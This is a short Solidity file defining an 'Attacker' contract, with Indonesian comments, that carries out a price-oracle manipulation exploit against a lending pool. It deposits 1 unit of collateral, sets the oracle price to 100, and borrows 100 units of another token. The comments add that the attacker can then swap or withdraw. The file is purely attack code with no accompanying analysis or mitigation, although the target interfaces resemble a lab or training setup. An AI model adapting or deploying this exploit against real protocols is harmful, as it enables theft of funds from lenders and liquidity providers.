// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ILendingPool {
    function deposit(uint amount) external;
    function borrow(uint amount) external;
}

interface IToken {
    function approve(address, uint) external returns (bool);
    function transfer(address, uint) external returns (bool);
}

interface IOracle {
    function setPrice(uint) external;
}

contract Attacker {
    ILendingPool public pool;
    IToken public collateral;
    IToken public borrowToken;
    IOracle public oracle;

    constructor(address _pool, address _collateral, address _borrow, address _oracle) {
        pool = ILendingPool(_pool);
        collateral = IToken(_collateral);
        borrowToken = IToken(_borrow);
        oracle = IOracle(_oracle);
    }

    function attack() external {
        // Approve and deposit 1 COL (harga 1)
        collateral.approve(address(pool), 1 ether);
        pool.deposit(1 ether);

        // Manipulasi harga jadi 100
        oracle.setPrice(100);

        // Borrow 100 BOR (padahal hanya deposit 1 COL)
        pool.borrow(100 ether);

        // Done. Attacker bisa swap / withdraw sekarang
    }
}
